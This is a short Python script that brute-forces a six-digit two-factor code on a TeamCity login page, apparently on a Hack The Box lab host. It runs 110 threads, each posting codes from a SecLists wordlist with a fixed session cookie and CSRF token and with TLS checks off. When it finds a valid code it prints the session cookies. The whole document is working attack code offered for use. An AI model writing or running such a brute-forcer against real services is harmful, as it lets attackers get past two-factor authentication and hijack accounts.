from queue import Queue
import requests
import sys
from threading import Thread, Lock
import urllib3
import time
import random
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

payload_list = '/usr/share/seclists/Fuzzing/6-digits-000000-999999.txt'
words = Queue()
lock = Lock()

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://teamcity-dev.coder.htb/2fa.html',
    'X-Requested-With': 'XMLHttpRequest',
    'X-Teamcity-Client': 'Web UI',
    'X-Tc-Csrf-Token': 'd5a18c2c-e0e1-44fd-ae55-647fbb486bc8',
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'Content-Length': '15',
    'Origin': 'https://teamcity-dev.coder.htb',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Te': 'trailers'
}

def get_words():
    with open(payload_list, 'r') as f:
        for line in f:
            words.put(line.strip())

def worker():
    session = requests.Session()
    while not words.empty():
        item = words.get()
        response = session.post('https://teamcity-dev.coder.htb/2fa.html',
                                data={'password': item},
                                verify=False,
                                headers=headers,
                                cookies={'TCSESSIONID': '90B50C5C71DA8D08797918C8BE813069', '__test': '1'})
        status = response.status_code
        with lock:
            print(f'{item}                                                  {status}', end='\r')
        if status > 200 and status < 500:
            print('\n\n\n', end='\n')
            print(response.cookies.get_dict())
            exit(0)
        if status > 500:
            words.put(item)

def start():
    threads = 110
    get_words()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(worker)
    print('\nAll threads completed.')

start()
